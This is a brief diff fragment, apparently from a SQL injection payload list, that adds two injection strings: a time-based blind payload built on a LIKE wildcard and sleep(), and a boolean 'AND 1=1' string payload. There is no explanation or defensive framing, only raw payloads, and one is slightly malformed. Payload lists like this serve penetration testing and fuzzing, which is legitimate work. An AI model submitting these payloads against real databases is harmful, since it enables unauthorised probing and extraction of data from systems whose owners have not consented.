@@ -82,6 +82,10 @@ CURRENT_USER instead of CURRENT_USER()
 
 
 
+test' or us.username like '%' and sleep(42_='1
+
+
+AND 1=1 AND '%'='
 
 
 
